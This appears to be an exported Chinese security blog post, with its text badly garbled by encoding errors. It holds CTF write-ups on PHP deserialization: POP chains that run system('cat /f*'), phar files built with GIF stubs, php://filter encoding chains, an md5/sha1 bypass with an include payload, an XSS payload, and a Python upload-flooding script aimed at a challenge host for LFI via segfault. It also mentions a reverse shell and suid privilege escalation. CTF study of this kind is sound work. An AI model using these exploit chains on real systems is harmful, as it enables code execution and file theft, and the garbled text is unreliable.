\u0026#39;O:1:\u0026#34;A\u0026#34;:{s:6:\u0026#34;config\u0026#34;;s:1:\u0026#34;w\u0026#34;;}\u0026#39; }, data={ 0: open(\u0026#39;./ars2.zip\u0026#39;, \u0026#39;rb\u0026#39;).read() } ) # å†™å…¥ res = requests.post( url, params={ 0: \u0026#39;O:1:\u0026#34;A\u0026#34;:1:{s:6:\u0026#34;config\u0026#34;;s:1:\u0026#34;r\u0026#34;;}\u0026#39; }, data={ 0: \u0026#39;phar://tmp/a.txt\u0026#39; } ) # è§¦å‘ print(res.text) å¾—åˆ°flag\nå‚è€ƒï¼šæµ…æGCå›æ”¶æœºåˆ¶ä¸pharååºåˆ—åŒ–\n[GFCTF 2021]æ–‡ä»¶æŸ¥çœ‹å™¨ User.class.php\n\u0026lt;?php error_reporting(0); class User{ public $username; // new Myerror(); public $password; // [new User(), \u0026#34;check\u0026#34;]; public function login(){ include(\u0026#34;view/login.html\u0026#34;); if(isset($_POST[\u0026#39;username\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;password\u0026#39;])){ $this-\u0026gt;username=$_POST[\u0026#39;username\u0026#39;]; $this-\u0026gt;password=$_POST[\u0026#39;password\u0026#39;]; if($this-\u0026gt;check()){ header(\u0026#34;location:./?c=Files\u0026amp;m=read\u0026#34;); } } } public function check(){ if($this-\u0026gt;username===\u0026#34;admin\u0026#34; \u0026amp;\u0026amp; $this-\u0026gt;password===\u0026#34;admin\u0026#34;){ return true; }else{ echo \u0026#34;{$this-\u0026gt;username}çš„å¯†ç ä¸æ­£ç¡®æˆ–ä¸å­˜åœ¨è¯¥ç”¨æˆ·\u0026#34;; // Myerror::__toString return false; } } public function __destruct(){ (@$this-\u0026gt;password)(); // popå…¥å£ å¯ä»¥é€šè¿‡æ•°ç»„å½¢å¼è®¿é—®ä»»æ„ç±»çš„ä»»æ„æ–¹æ³• User::check } public function __call($name,$arg){ // ä¸å­˜åœ¨æ–¹æ³• ($name)(); } } Files.class.php\n\u0026lt;?php class Files{ public $filename; public function __construct(){ $this-\u0026gt;log(); } public function read(){ include(\u0026#34;view/file.html\u0026#34;); if(isset($_POST[\u0026#39;file\u0026#39;])){ // ä¼ å…¥æ–‡ä»¶å $this-\u0026gt;filename=$_POST[\u0026#39;file\u0026#39;]; }else{ die(\u0026#34;è¯·è¾“å…¥æ–‡ä»¶å\u0026#34;); } $contents=$this-\u0026gt;getFile(); echo \u0026#39;\u0026lt;br\u0026gt;\u0026lt;textarea class=\u0026#34;file_content\u0026#34; type=\u0026#34;text\u0026#34; value=\u0026#39;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$contents; } public function filter(){ if(preg_match(\u0026#39;/^\\/|phar|flag|data|zip|utf16|utf-16|\\.\\.\\//i\u0026#39;,$this-\u0026gt;filename)){ // pharæ— ç–‘ è™½ç„¶è¢«banäº† åŠ filterç»•è¿‡(utf-16æç¤º throw new Error(\u0026#34;è¿™ä¸åˆç†\u0026#34;); } } public function getFile(){ $contents=file_get_contents($this-\u0026gt;filename); $this-\u0026gt;filter(); // å¯¹filenameè¿‡æ»¤ if(isset($_POST[\u0026#39;write\u0026#39;])){ file_put_contents($this-\u0026gt;filename,$contents); // å†™å…¥å†…å®¹ phar } if(!empty($contents)){ return $contents; // è¯»phar è§¦å‘ååºåˆ—åŒ– }else{ die(\u0026#34;è¯¥æ–‡ä»¶ä¸å­˜åœ¨æˆ–è€…å†…å®¹ä¸ºç©º\u0026#34;); } } public function log(){ $log=new Myerror(); } public function __get($key){ // è¯»ä¸å­˜åœ¨å±æ€§ ($key)($this-\u0026gt;arg); // ç›®æ ‡ å¯rce // arg = \u0026#39;cat /f*\u0026#39;; } } Myerror.class.php\n\u0026lt;?php class Myerror{ public $message; // new Files(); public function __construct(){ ini_set(\u0026#39;error_log\u0026#39;,\u0026#39;/var/www/html/log/error.txt\u0026#39;); ini_set(\u0026#39;log_errors\u0026#39;,1); } public function __tostring(){ $test=$this-\u0026gt;message-\u0026gt;{$this-\u0026gt;test}; // Files::__get return \u0026#34;test\u0026#34;; // test = \u0026#39;system\u0026#39; } } æ„é€ popé“¾æ—¶ï¼Œæ³¨æ„password\n$user = new User(); $files = new Files(); $myerror = new Myerror(); $files-\u0026gt;arg = \u0026#39;cat /f*\u0026#39;; $myerror-\u0026gt;message = $files; $myerror-\u0026gt;test = \u0026#39;system\u0026#39;; $user-\u0026gt;username = $myerror; // $user-\u0026gt;password = [new User(), \u0026#34;check\u0026#34;]; è¿™æ ·ä¼šä½¿$userçš„ä¸¤ä¸ªå­—æ®µéƒ½èµ‹ä¸ä¸Šå€¼ $user-\u0026gt;password = [$user, \u0026#34;check\u0026#34;]; echo serialize($user); // O:4:\u0026#34;User\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;O:7:\u0026#34;Myerror\u0026#34;:2:{s:7:\u0026#34;message\u0026#34;;O:5:\u0026#34;Files\u0026#34;:2:{s:8:\u0026#34;filename\u0026#34;;N;s:3:\u0026#34;arg\u0026#34;;s:3:\u0026#34;dir\u0026#34;;}s:4:\u0026#34;test\u0026#34;;s:6:\u0026#34;system\u0026#34;;}s:8:\u0026#34;password\u0026#34;;a:2:{i:0;r:1;i:1;s:5:\u0026#34;check\u0026#34;;}} ç»æµ‹è¯•å¯ä»¥è§¦å‘ï¼Œä¹‹åå°±æ˜¯å¦‚ä½•å†™pharçš„é—®é¢˜äº†\nçœ‹ä»£ç å¯ä»¥çŸ¥é“æ²¡æœ‰ç›´æ¥çš„unserializeç‚¹ï¼Œé‚£å¤§æ¦‚ç‡æ˜¯pharï¼Œè™½ç„¶æ²¡æœ‰ä¸Šä¼ å¤„ ä½†æ˜¯Myerrorç±»çš„æ„é€ æ–¹æ³•ä¸­å¯ä»¥å†™æ—¥å¿—\nå¯ä»¥çœ‹åˆ°æ—¥å¿—ä¸­æœ‰è„æ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦å€ŸåŠ©è¿‡æ»¤å™¨çš„ç¼–ç æ¥åˆ å»ï¼›é¦–å…ˆæ˜¯æ¸…ç©ºæ–‡ä»¶å†…å®¹ï¼Œå¯ä»¥ç”¨php://filter/read=consumed/resource=log/error.txt\nä¹‹åè§‚å¯Ÿæ—¥å¿—å†…å®¹ï¼Œè„æ•°æ®+æ–‡ä»¶å†…å®¹+è„æ•°æ®ï¼Œåªç”¨b64è‚¯å®šä¸è¡Œï¼Œæˆ‘ä»¬å°è¯•æŠŠé™¤æ–‡ä»¶ä¹‹å¤–çš„å…¶ä»–å†…å®¹å˜ä¸ºb64çš„éæ³•å­—ç¬¦ï¼Œè¿™æ ·æœ€åb64è§£ç å³å¯\næˆ‘ä»¬å¯ä»¥å…ˆå°†æ•°æ®è½¬æ¢ä¸ºutf-16leçš„æ ¼å¼ï¼Œç”±åŸå…ˆçš„utf-8è½¬æ¢ä¸ºutf-16leæ—¶ï¼Œæ¯ä¸€ä½å­—ç¬¦åé¢éƒ½ä¼šç›´æ¥æ·»åŠ ä¸€ä¸ªä¸å¯è§å­—ç¬¦\\0ï¼Œå†è½¬å›utf-8æ—¶ï¼Œä¹‹ååé¢å¸¦\\0çš„æ‰ä¼šè¢«è½¬æ¢ å…¶ä½™çš„ä¼šè¢«å½“æˆä¹±ç ï¼›è¿™ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚\né¢˜ä¸­utf-16leè¢«banäº†ï¼Œæˆ‘ä»¬ç”¨ucs-2æ¥ä»£æ›¿\næœ€åè¦å¤„ç†çš„æ—¶ç©ºå­—èŠ‚ï¼Œfile_get_contentsåœ¨åŠ è½½æœ‰ç©ºå­—èŠ‚çš„æ–‡ä»¶æ—¶ä¼šæŠ¥warningï¼Œæˆ‘ä»¬ç”¨quoted-printableè¿™ç§ç¼–ç ï¼Œå³php://filter/convert.quoted-printable-decodeè¿™ç§è¿‡æ»¤å™¨ï¼›å®ƒå¯¹äºæ‰€æœ‰å¯æ‰“å°å­—ç¬¦çš„asciiç ï¼ˆé™¤=ä»¥å¤–ï¼‰éƒ½ä¸å˜ï¼Œå¯¹äº=å’Œä¸å¯æ‰“å°çš„asciiç ä»¥åŠéasciiç çš„æ•°æ®ç¼–ç æ—¶ ä¼šå…ˆå°†æ¯ä¸ªå­—èŠ‚çš„äºŒè¿›åˆ¶ä»£ç ç”¨ä¸¤ä¸ª16è¿›åˆ¶æ•°è¡¨ç¤º å†åœ¨å‰é¢åŠ ä¸€ä¸ªç­‰å·ï¼Œæ¯”å¦‚=-\u0026gt;=3D\næˆ‘ä»¬çš„ç¼–ç é¡ºåº\nbase64-encode-\u0026gt; utf-8-\u0026gt; ucs-2-\u0026gt; convert.quoted-printable-decode ä¼šè¢«è§£ç çš„é¡ºåº\nconvert.quoted-printable-decode-\u0026gt; ucs-2-\u0026gt; utf-8-\u0026gt; base64-decode ç»è¿‡è¿™ä¸‰æ¬¡ç¼–ç åå°±ä¼šæœ‰çº¯å‡€çš„pharæ–‡ä»¶å†…å®¹\næœ€æœ€æœ€åçš„è€ƒç‚¹ï¼Œthrow new Errorçš„å­˜åœ¨ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ”¹i:0å’Œç­¾å\n\u0026lt;?php class User{ public $username; public $password; public function __construct() { $this-\u0026gt;username = new Myerror(); } } class Files{ public $filename; } class Myerror{ public $message; } $user = new User(); $files = new Files(); $myerror = new Myerror(); $files-\u0026gt;arg = \u0026#39;cat /f*\u0026#39;; $myerror-\u0026gt;message = $files; $myerror-\u0026gt;test = \u0026#39;system\u0026#39;; $user-\u0026gt;username = $myerror; $user-\u0026gt;password = [$user, \u0026#34;check\u0026#34;]; $a = [$user, null]; $phar = new Phar(\u0026#39;phar.phar\u0026#39;); $phar -\u0026gt; startBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); // è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´ $phar -\u0026gt; addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;test\u0026#39;); // æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $phar -\u0026gt; setMetadata($a); // å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest $phar -\u0026gt; stopBuffering(); æ”¹ç­¾åå’Œi:0ï¼ˆç•¥\nç¼–ç \n\u0026lt;?php $b=file_get_contents(\u0026#39;change.phar\u0026#39;); $payload=iconv(\u0026#39;utf-8\u0026#39;,\u0026#39;UCS-2\u0026#39;,base64_encode($b)); file_put_contents(\u0026#39;payload.txt\u0026#39;,quoted_printable_encode($payload)); $s = file_get_contents(\u0026#39;payload.txt\u0026#39;); $s = preg_replace(\u0026#39;/=\\r\\n/\u0026#39;, \u0026#39;\u0026#39;, $s); echo $s; å¼€æ‰“ï¼šé¦–å…ˆå†™payloadï¼Œç„¶åç¬¬ä¸€ä¸ªè¿‡æ»¤å™¨\nphp://filter/write=convert.quoted-printable-decode/resource=log/error.txt ç¬¬äºŒä¸ª\nphp://filter/write=convert.iconv.ucs-2.utf-8/resource=log/error.txt ç¬¬ä¸‰ä¸ª\nphp://filter/write=convert.base64-decode/resource=log/error.txt è¿™é‡Œå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œæœ«å°¾ç­‰å·å°‘ä¸€ä¸ªï¼Œæˆ‘ä»¬éœ€è¦åœ¨payloadæœ«å°¾å†åŠ ä¸€ä¸ª=00=3Dè®©ç­‰å·æ­£å¸¸éœ²å‡º\næ”¹å¥½ä¹‹åæ¸…ç©ºæ—¥å¿—æ–‡ä»¶ï¼Œç›´æ¥ä¸‰ä¸ªè¿‡æ»¤å™¨ä¸€èµ·ç”¨\nphp://filter/read=convert.quoted-printable-decode|convert.iconv.ucs-2.utf-8|convert.base64-decode/resource=log/error.txt å¾—åˆ°flag\nå‚è€ƒï¼šwp\nåŸç”ŸæŠ¥é”™/å¼‚å¸¸ç±» Error/Exception - ç»•md5 [æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp \u0026lt;?php error_reporting(0); class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-\u0026gt;syc != $this-\u0026gt;lover) \u0026amp;\u0026amp; (md5($this-\u0026gt;syc) === md5($this-\u0026gt;lover)) \u0026amp;\u0026amp; (sha1($this-\u0026gt;syc)=== sha1($this-\u0026gt;lover)) ){ if(!preg_match(\u0026#34;/\\\u0026lt;\\?php|\\(|\\)|\\\u0026#34;|\\\u0026#39;/\u0026#34;, $this-\u0026gt;syc, $match)){ eval($this-\u0026gt;syc); } else { die(\u0026#34;Try Hard !!\u0026#34;); } } } } if (isset($_GET[\u0026#39;great\u0026#39;])){ unserialize($_GET[\u0026#39;great\u0026#39;]); } else { highlight_file(__FILE__); } ?\u0026gt; å¹³å¸¸éƒ½æ˜¯ç”¨æ•°ç»„ï¼Œä½†æ˜¯è¿™æ˜¯åœ¨ç±»é‡Œé¢ï¼Œæ•°ç»„å°±ä¸è¡Œäº†ï¼Œå¾—ç”¨åŸç”Ÿç±»Errorï¼ˆphp7ï¼‰æˆ–Exceptionï¼ˆphp5 or 7ï¼‰ï¼Œå®ƒæœ‰__toStringæ–¹æ³•ï¼Œè¢«è§¦å‘åä¼šä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å‡ºå½“å‰ä¿å­˜æƒ…å†µï¼ŒåŒ…æ‹¬é”™è¯¯ä¿¡æ¯å’Œå½“å‰æŠ¥é”™çš„è¡Œå·ï¼Œè€Œè·Ÿä¼ å…¥çš„å‚æ•°æ²¡æœ‰å…³ç³»ï¼›æ‰€ä»¥è¯´å¯ä»¥æ„é€ ä¸¤ä¸ªç±»çš„å®ä¾‹ï¼Œå®ƒä»¬è¡Œå·ç›¸åŒï¼ˆè¢«__toStringè°ƒç”¨åè¾“å‡ºä¿¡æ¯ä¸€æ ·ï¼‰ï¼Œä½†æ˜¯æœ¬èº«ä¸ç›¸åŒï¼ˆä¼ å…¥å‚æ•°ä¸ç­‰ï¼‰\n$payload = \u0026#34;?\u0026gt;\u0026lt;?=include~\u0026#34;.urldecode(urlencode(~\u0026#39;/flag\u0026#39;)).\u0026#34;?\u0026gt;\u0026#34;; $a = new Error($payload,1); $b = new Error($payload,2); $s = new SYCLOVER(); $s-\u0026gt;syc = $a; $s-\u0026gt;lover = $b; echo urlencode(serialize($s)); æ³¨æ„$aå’Œ$bå†™åˆ°ä¸€è¡Œ\nError/Exception - XSS å‚è€ƒï¼šå…³äºå¦‚ä½•åˆ©ç”¨phpçš„åŸç”Ÿç±»è¿›è¡ŒXSS\n\u0026lt;?php $a = new Error(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;xss\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;); $b = serialize($a); echo urlencode($b); echo unserialize($b); äºŒæ¬¡åºåˆ—åŒ–/fast destruct https://zhuanlan.zhihu.com/p/405838002\n\u0026lt;?php $raw = \u0026#39;O:1:\u0026#34;A\u0026#34;:1:{s:1:\u0026#34;a\u0026#34;;s:1:\u0026#34;b\u0026#34;;}\u0026#39;; echo serialize(unserialize($raw)); //O:1:\u0026#34;A\u0026#34;:1:{s:1:\u0026#34;a\u0026#34;;s:1:\u0026#34;b\u0026#34;;} ä¸Šé¢æ˜¯ä¸€ä¸ªç›¸å½“æ­£å¸¸çš„äºŒæ¬¡åºåˆ—åŒ–çš„æ —å­ï¼ˆå°†åºåˆ—åŒ–ç»“æœååºåˆ—åŒ–åå†åºåˆ—åŒ–ï¼‰ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡Œå¹¶ä¸æ˜¯çœŸçš„æœ‰ä¸€ä¸ªç±»Aï¼Œåœ¨æ“ä½œæ—¶ phpå†…éƒ¨ä¼šæŠŠä¸å­˜åœ¨çš„ç±»è½¬æ¢æˆ__PHP_Incomplete_Classè¿™ç§ç‰¹æ®Šçš„ç±»ï¼ŒåŒæ—¶å°†åŸå§‹çš„ç±»åAå­˜æ”¾åœ¨__PHP_Incomplete_Class_Nameè¿™ä¸ªå±æ€§ä¸­ï¼Œå…¶ä½™å±æ€§å­˜æ”¾æ–¹å¼ä¸å˜ï¼›è€Œæˆ‘ä»¬åœ¨åºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œserializeé‡åˆ°__PHP_Incomplete_Classè¿™ä¸ªç‰¹æ®Šç±»ä¼šå€’æ¨å›æ¥ï¼Œåºåˆ—åŒ–æˆ__PHP_Incomplete_Class_Nameå€¼ä¸ºç±»åçš„ç±»ï¼Œæˆ‘ä»¬çœ‹åˆ°çš„åºåˆ—åŒ–ç»“æœä¸æ˜¯O:22:\u0026quot;__PHP_Incomplete_Class_Name\u0026quot;:2:{xxx}è€Œæ˜¯O:1:\u0026quot;A\u0026quot;:1:{s:1:\u0026quot;a\u0026quot;;s:1:\u0026quot;b\u0026quot;;}ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æ„é€ \n\u0026lt;?php $raw = \u0026#39;a:2:{i:0;O:8:\u0026#34;stdClass\u0026#34;:1:{s:3:\u0026#34;abc\u0026#34;;N;}i:1;O:22:\u0026#34;__PHP_Incomplete_Class\u0026#34;:1:{s:3:\u0026#34;abc\u0026#34;;N;}}\u0026#39;; var_dump(unserialize($raw)); var_dump(unserialize(serialize(unserialize($raw)))); å¯ä»¥æ³¨æ„åˆ°åœ¨äºŒæ¬¡åºåˆ—åŒ–å__PHP_Incomplete_Classä¸ºç©ºï¼Œå‡ºç°serialize(unserialize($x))!=$xçš„æƒ…å†µ\n[å¼ºç½‘æ¯ 2021]WhereIsUWebShell https://miaotony.xyz/2021/06/28/CTF_2021qiangwang/#toc-heading-5\n\u0026lt;!-- You may need to know what is in e2a7106f1cc8bb1e1318df70aa0a3540.php--\u0026gt; \u0026lt;?php // index.php ini_set(\u0026#39;display_errors\u0026#39;, \u0026#39;on\u0026#39;); if(!isset($_COOKIE[\u0026#39;ctfer\u0026#39;])){ setcookie(\u0026#34;ctfer\u0026#34;,serialize(\u0026#34;ctfer\u0026#34;),time()+3600); }else{ include \u0026#34;function.php\u0026#34;; echo \u0026#34;I see your Cookie\u0026lt;br\u0026gt;\u0026#34;; $res = unserialize($_COOKIE[\u0026#39;ctfer\u0026#39;]); if(preg_match(\u0026#39;/myclass/i\u0026#39;,serialize($res))){ throw new Exception(\u0026#34;Error: Class \u0026#39;myclass\u0026#39; not found \u0026#34;); } } highlight_file(__FILE__); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; highlight_file(\u0026#34;myclass.php\u0026#34;); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; highlight_file(\u0026#34;function.php\u0026#34;); \u0026lt;?php // myclass.php class Hello{ public function __destruct() { if($this-\u0026gt;qwb) echo file_get_contents($this-\u0026gt;qwb); } } ?\u0026gt; \u0026lt;?php // function.php function __autoload($classname){ require_once \u0026#34;/var/www/html/$classname.php\u0026#34;; } ç®€åŒ–ä¸€ä¸‹å°±æ˜¯\nif (preg_match(\u0026#39;/myClass/i\u0026#39;, unserialize(serialize($_COOKIE[\u0026#39;ctfer\u0026#39;])))){ throw new Exception(\u0026#34;Error: Class \u0026#39;myclass\u0026#39; not found \u0026#34;); } å¾ˆæ˜¾ç„¶ä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰myClassè¿™ä¸ªç±» äºŒæ¬¡åºåˆ—åŒ–ä¹‹åä¼šç›´æ¥æŠ¥é”™ï¼Œå…¶ä¸­ä¸€ç§å¤„ç†æ–¹å¼æ˜¯å»æ‰æœ«å°¾çš„}\nO:7:\u0026#34;myclass\u0026#34;:1:{s:1:\u0026#34;h\u0026#34;;O:5:\u0026#34;Hello\u0026#34;:1:{s:3:\u0026#34;qwb\u0026#34;;s:36:\u0026#34;e2a7106f1cc8bb1e1318df70aa0a3540.php\u0026#34;;} O%3A7%3A%22myclass%22%3A1%3A%7Bs%3A1%3A%22h%22%3BO%3A5%3A%22Hello%22%3A1%3A%7Bs%3A3%3A%22qwb%22%3Bs%3A36%3A%22e2a7106f1cc8bb1e1318df70aa0a3540%2Ephp%22%3B%7D æˆ–è€…å½“å±æ€§ä¸ºç©ºæ—¶ï¼Œå±æ€§å€¼ååºåˆ—åŒ–ä¹‹åä¸ä¼šèµ‹å€¼åˆ°å¯¹è±¡ä¸Šï¼Œè¿™æ ·å°±èƒ½ç»•è¿‡myclassçš„é™åˆ¶ï¼ˆä¿®æ”¹åºåˆ—åŒ–æ•°å­—å…ƒç´ ä¸ªæ•°ï¼‰\nO:8:\u0026#34;stdClass\u0026#34;:4:{s:0:\u0026#34;\u0026#34;;O:7:\u0026#34;myclass\u0026#34;:0:{}s:1:\u0026#34;b\u0026#34;;O:5:\u0026#34;Hello\u0026#34;:1:{s:3:\u0026#34;qwb\u0026#34;,s:36:\u0026#34;e2a7106f1cc8bb1e1318df70aa0a3540.php\u0026#34;;}} // e2a7106f1cc8bb1e1318df70aa0a3540.php \u0026lt;?php include \u0026#34;bff139fa05ac583f685a523ab3d110a0.php\u0026#34;; include \u0026#34;45b963397aa40d4a0063e0d85e4fe7a1.php\u0026#34;; // bff139fa05ac583f685a523ab3d110a0.php function PNG($file)\t// å¤„ç†ä¸Šä¼ çš„PNGå›¾ç‰‡ { if(!is_file($file)){die(\u0026#34;æˆ‘ä»æ¥æ²¡æœ‰è§è¿‡ä¾¬\u0026#34;);} $first = imagecreatefrompng($file); if(!$first){ die(\u0026#34;å‘ç°äº†å¥‡æ€ªçš„ä¸œè¥¿2333\u0026#34;); } $size = min(imagesx($first), imagesy($first));\t// ä»¥æœ€å°å®½åº¦ä¸ºé™åˆ‡å‰²ä¸ºæ­£æ–¹å½¢ æˆ‘ä»¬ç›´æ¥ç”Ÿæˆçš„æ—¶å€™å°±æä¸ªæ­£æ–¹å½¢ unlink($file); $second = imagecrop($first, [\u0026#39;x\u0026#39; =\u0026gt; 0, \u0026#39;y\u0026#39; =\u0026gt; 0, \u0026#39;width\u0026#39; =\u0026gt; $size, \u0026#39;height\u0026#39; =\u0026gt; $size]); if ($second !== FALSE) { imagepng($second, $file); imagedestroy($second);//é”€æ¯ï¼Œæ¸…å†…å­˜ } imagedestroy($first); } // 45b963397aa40d4a0063e0d85e4fe7a1.php function GenFiles(){ $files = array(); $str = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; $len=strlen($str)-1; for($i=0;$i\u0026lt;10;$i++){ $filename=\u0026#34;php\u0026#34;; for($j=0;$j\u0026lt;6;$j++){ $filename .= $str[rand(0,$len)]; } // file_put_contents(\u0026#39;/tmp/\u0026#39;.$filename,\u0026#39;flag{fake_flag}\u0026#39;); $files[] = $filename; } return $files; } $file = isset($_GET[\u0026#39;72aa377b-3fc0-4599-8194-3afe2fc9054b\u0026#39;])?$_GET[\u0026#39;72aa377b-3fc0-4599-8194-3afe2fc9054b\u0026#39;]:\u0026#34;404.html\u0026#34;; $flag = preg_match(\u0026#34;/tmp/i\u0026#34;,$file); if($flag){ PNG($file); } include($file);\t// åŒ…å«é‚£ä¸ªPNG $res = @scandir($_GET[\u0026#39;dd9bd165-7cb2-446b-bece-4d54087185e1\u0026#39;]); if(isset($_GET[\u0026#39;dd9bd165-7cb2-446b-bece-4d54087185e1\u0026#39;])\u0026amp;\u0026amp;$_GET[\u0026#39;dd9bd165-7cb2-446b-bece-4d54087185e1\u0026#39;]===\u0026#39;/tmp\u0026#39;){ $somthing = GenFiles(); $res = array_merge($res,$somthing); } // /e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=x\u0026amp;dd9bd165-7cb2-446b-bece-4d54087185e1=/tmp shuffle($res); @print_r($res); ?\u0026gt; æˆ‘ä»¬åˆ©ç”¨LFI via segmentfaulté‚£ä¸ªæŠ€å·§ | LFI via SegmentFault\ninclude.php?file=php://filter/string.strip_tags/resource=/etc/passwd string.strip_tagså¯ä»¥å¯¼è‡´phpåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­Segment Fault\nå¦‚æœè¯·æ±‚ä¸­åŒæ—¶å­˜åœ¨ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šè¢«ä¿ç•™ï¼Œå­˜å‚¨åœ¨/tmp/phpxxxxxxxxxxxï¼ˆxxxxxæ˜¯æ•°å­—+å­—æ¯çš„6ä½æ•°ï¼‰ï¼Œè¿™ä¸ªæ–‡ä»¶è¿ç»­ä¿å­˜ï¼Œä¸ç”¨ç«äº‰ç›´æ¥çˆ†ç ´ï¼ˆå¤šçº¿ç¨‹ä¸Šä¼ æ–‡ä»¶ï¼Œç”Ÿæˆå¤šä¸ªphpxxxxxxxxxxxï¼‰\n# -*- coding: utf-8 -*- import requests import string import itertools charset = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39; base_url = \u0026#34;http://eci-2ze9gh3z7jcw29alwhuz.cloudeci1.ichunqiu.com\u0026#34; def upload_file_to_include(url, file_content): files = {\u0026#39;file\u0026#39;: (\u0026#39;evil.jpg\u0026#39;, file_content, \u0026#39;image/jpeg\u0026#39;)} try: response = requests.post(url, files=files) print(response) except Exception as e: print(e) def generate_tmp_files(): with open(\u0026#39;miao.png\u0026#39;, \u0026#39;rb\u0026#39;) as fin: file_content = fin.read() phpinfo_url = \u0026#34;%s/e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=php://filter/string.strip_tags/resource=passwd\u0026#34; % ( base_url) length = 6 times = int(len(charset) ** (length / 2)) for i in range(times): print(\u0026#34;[+] %d / %d\u0026#34; % (i, times)) upload_file_to_include(phpinfo_url, file_content) def main(): generate_tmp_files() if __name__ == \u0026#34;__main__\u0026#34;: main() åå¼¹shellï¼Œsuidææƒåç¿»æ‰¾flag\n","date":"2022-04-24T21:42:33+08:00","permalink":"https://amiaaaz.github.io/2022/04/24/php-unserialize-notes/","section":"posts","tags":["PHP","unserialize"],"title":"phpååºåˆ—åŒ–ä¸­çš„æŠ¥é”™\u0026GCä¸äºŒæ¬¡åºåˆ—åŒ–é—®é¢˜"},{"categories":["NOTES\u0026SUMMARY"],"contents":"http://0n0.fun/post/2018/03/learn-about-rpo-from-one-ctf-challenge/\nRPOæŒ‡Relative Path Overwrite ç›¸å¯¹è·¯å¾„è¦†ç›–ï¼Œåˆ©ç”¨æµè§ˆå™¨å’ŒæœåŠ¡å™¨çš„è§£æå·®å¼‚ å°†é¡µé¢ä¸­ä½¿ç”¨ç›¸å¯¹è·¯å¾„å¼•å…¥çš„é™æ€èµ„æºæ–‡ä»¶è¿›è¡Œæ›¿æ¢ï¼Œå®ŒæˆRPOæ”»å‡»\næœ€å¸¸è§çš„å°±æ˜¯å¯¹url pathçš„è§£æå·®å¼‚ï¼Œæ¯”å¦‚è¿™æ ·çš„url\nhttp://192.168.31.175/test%2findex.html é»˜è®¤æƒ…å†µä¸‹apacheä¼šè®¤ä¸ºè¯·æ±‚çš„æ˜¯test%2findex.htmlï¼Œæ— æ³•è®¿é—®ï¼Œè€ŒNginxä¼šå°†%2fè§£æä¸º/ ä»è€Œè®¤ä¸ºè¯·æ±‚çš„æ˜¯testæ–‡ä»¶å¤¹ä¸‹çš„index.htmlï¼Œæ­£å¸¸è®¿é—®ï¼ˆå¯ä»¥é€šè¿‡ä¿®æ”¹è·¯ç”±è§„åˆ™æ¥å½±å“è¿™äº›ï¼‰\nå¦ä¸€ä¸ªéœ€è¦æ»¡è¶³çš„æ¡ä»¶æ˜¯é¡µé¢é™æ€èµ„æºæ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ï¼Œä»¥ä¸‹é¢çš„é¢˜ä¸ºä¾‹\n[å¼ºç½‘æ¯ 2018]share mind *æ²¡æœ‰æ‰¾åˆ°dockeræ–‡ä»¶ï¼Œä»¥ä¸‹å†…å®¹å‚è€ƒwp1 | wp2\næˆ‘ä»¬å¯ä»¥åœ¨reporté¡µé¢ç»™botæäº¤ä¸€ä¸ªlinkï¼Œè¿˜å¯ä»¥å†™noteï¼Œå¦‚æœä¸å†™æ ‡é¢˜åªå†™å†…å®¹çš„è¯åœ¨viewæ—¶æ–‡ç« é¡µé¢æ˜¯ç›´æ¥æ‰“å°çš„å†…å®¹ï¼ˆæ— \u0026lt;h1\u0026gt;ï¼‰ï¼Œè€Œä¸¤ä¸ªéƒ½å†™äº†çš„è¯æ˜¯æŠŠæ–‡ç« æ ‡é¢˜å’Œå†…å®¹éƒ½è¾“å‡ºåœ¨htmlæ ‡ç­¾ä¹‹é—´çš„ï¼ˆæœ‰\u0026lt;h1\u0026gt;ï¼‰\nåœ¨é¡µé¢æºç ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°jquery.min.jsè¿™ä¸ªæ–‡ä»¶æ˜¯ä½¿ç”¨çš„ç›¸å¯¹è·¯å¾„çš„æ–¹å¼å¼•å…¥åˆ°index.phpé¡µé¢\nä¹Ÿå°±æ˜¯è¯´å¦‚æœè®¿é—®çš„é¡µé¢æ˜¯http://39.107.33.96:20000/index.php/åˆ™ä¼šå¼•å…¥http://39.107.33.96:20000/index.php/static/js/jquery.min.jsï¼Œç»“åˆæˆ‘ä»¬å‰é¢æè¿‡çš„urlè§£æé—®é¢˜ï¼Œå¦‚æœè®¿é—®çš„é¡µé¢æ˜¯http://39.107.33.96:20000/index.php/view/article/1494/..%2f..%2f..%2f..%2f 